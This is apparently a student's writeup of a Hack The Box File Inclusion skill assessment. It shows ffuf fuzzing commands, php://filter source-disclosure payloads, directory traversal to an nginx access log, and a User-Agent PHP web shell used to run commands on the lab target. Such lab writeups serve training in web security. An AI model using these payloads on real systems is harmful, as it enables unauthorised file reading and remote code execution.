![Screenshot 2025-04-16 135803](https://github.com/user-attachments/assets/dde0de45-973f-4f3c-8301-b7d73b09fb7f)![Screenshot 2025-04-16 135741](https://github.com/user-attachments/assets/b9490bf9-0290-4a9a-8486-b7449d237744)# Skill Assessment HTB File Inclusion Writeup

After completing all the learning materials in HTB from File Inclusion, now it's time for skill assessment.

Let's start by typing the given target in browser. 

![Screenshot 2025-04-16 122158](https://github.com/user-attachments/assets/139d79ef-db19-4cb3-abb2-2b2773878a25)

After analysing all the pages, i found out the `page` as a parameter. (Seen in the above figure)

Opened that in burp suite and tried to get something out of that using `LFI-Jhaddix.txt`. Found out two different sizes of responses, one has invalid input and another has nothing interested. 

![Screenshot 2025-04-16 123012](https://github.com/user-attachments/assets/d6a66a10-f594-43e9-8362-ae1e52765437)

So, I moved to PHP wrappers. 

Here, first I used `contact` as a first resource and when decoded, there was nothing interesting.

```bash
php://filter/read=convert.base64-encode/resource=contact
```

![Screenshot 2025-04-16 124448](https://github.com/user-attachments/assets/aceb9d96-afa5-4f37-844d-dbee885ace76)

So I decoded it and found that its content was not useful so I thought of fuzzing the PHP files using ffuf
```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://83.136.255.230:36621/FUZZ.php
```
![image](https://github.com/user-attachments/assets/eb56a909-377e-4416-87c2-5fb46eecd192)

But when I tried with index as a resource. Found something interested. 
```bash
php://filter/read=convert.base64-encode/resource=index
```
![Screenshot 2025-04-16 130346](https://github.com/user-attachments/assets/2f21001a-6718-4656-8441-ba11715c7d61)

Unsanitaized Admin page is found here. This indicates that there is a hidden Admin panel and it displays some logs.

![Screenshot 2025-04-16 130633](https://github.com/user-attachments/assets/b782e58c-6fb1-46ca-ba5d-460d0392b1e6)

I also noticed that there is another parameter that specifies the type of logs that are displayed, So I tried to use LFI payloads and it worked.

![image](https://github.com/user-attachments/assets/283fae8e-145d-4b12-b332-386e275bb07e)

Then I tried to access the file that contains the web application’s logs by fuzzing these files to reach the correct path.

```bash
ffuf -w ./Downloads/LFI-gracefulsecurity-linux.txt:FUZZ -u http://94.237.55.96:37944/ilf_admin/index.php?log=../../../../../../../../../../FUZZ -fs 2046
```
![image](https://github.com/user-attachments/assets/b9c06d60-c591-430d-9813-4766a8a284ea)

```bash
index.php?log=../../../../../../../../../..//var/log/nginx/access.log&cmd=id
User Agent: <?php system ($_GET['cmd']); ?>
```

![Screenshot 2025-04-16 135741](https://github.com/user-attachments/assets/249a9d64-e80d-40e2-a949-d9c4f56049b3)

Found uid, gid and groups that means we can get the flags by using shell as a user agent.

```bash
php?log=../../../../../../../../../..//var/log/nginx/access.log&cmd=ls+/
```
![Screenshot 2025-04-16 135803](https://github.com/user-attachments/assets/7b75caeb-df7f-48db-a092-abb3404636cf)

```bash
php?log=../../../../../../../../../..//var/log/nginx/access.log&cmd=ls+/<file_name>
```
